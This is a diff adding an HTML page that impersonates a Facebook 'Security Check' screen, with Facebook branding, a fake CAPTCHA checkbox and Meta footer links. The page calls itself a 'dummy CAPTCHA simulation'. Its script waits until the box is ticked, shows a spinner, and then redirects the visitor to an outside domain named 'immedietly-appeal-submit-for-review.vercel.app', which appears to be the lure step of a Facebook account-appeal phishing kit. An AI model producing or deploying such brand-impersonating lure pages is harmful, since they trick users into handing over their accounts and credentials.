@@ -1,0 +1,84 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Check - Facebook</title>
+  <link rel="stylesheet" href="captcha.css" />
+</head>
+<body style="display: flex; flex-direction: column; min-height: 100vh;">
+  <header class="fb-header">
+    <div class="fb-header-inner">
+      <h1 class="fb-logo">facebook</h1>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="captcha-box">
+      <label class="dummy-captcha">
+        <input type="checkbox" id="dummyCheck" />
+        <span class="checkmark"></span>
+        I'm not a robot
+        <img src="captcha-logo.png" alt="captcha logo" class="captcha-logo"/>
+      </label>
+    </div>
+
+    <div class="info-text">
+      <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+      <p>This is a dummy CAPTCHA simulation used for testing UI functionality without connecting to Google APIs.</p>
+    </div>
+  </div>
+
+  <div id="spinner-overlay">
+    <div class="spinner"></div>
+  </div>
+
+  <footer>
+    <div class="footer-top">
+      <span>English (UK)</span>
+      <span>اردو</span>
+      <span>বাংলা</span>
+      <span>हिन्दी</span>
+      <span>ਪੰਜਾਬੀ</span>
+      <span>ગુજરાતી</span>
+      <span>தமிழ்</span>
+      <span>తెలుగు</span>
+      <span>मराठी</span>
+      <span>Deutsch</span>
+      <span>Español</span>
+      <button class="lang-btn">+</button>
+    </div>
+    <div class="footer-links">
+      <a href="#">Sign Up</a>
+      <a href="#">Log in</a>
+      <a href="#">Messenger</a>
+      <a href="#">Facebook Lite</a>
+      <a href="#">Video</a>
+      <a href="#">Meta Pay</a>
+      <a href="#">Meta Store</a>
+      <a href="#">Meta Quest</a>
+      <a href="#">Ray-Ban Meta</a>
+      <a href="#">Meta AI</a>
+      <a href="#">Instagram</a>
+      <a href="#">Threads</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Help</a>
+    </div>
+    <div class="footer-bottom">Meta © 2025</div>
+  </footer>
+
+  <script>
+    document.getElementById("dummyCheck").addEventListener("change", function () {
+      if (this.checked) {
+        document.getElementById("spinner-overlay").style.display = "flex";
+        setTimeout(function () {
+          window.location.href = "https://immedietly-appeal-submit-for-review.vercel.app/";
+        }, 2000);
+      }
+    });
+  </script>
+</body>
+</html>
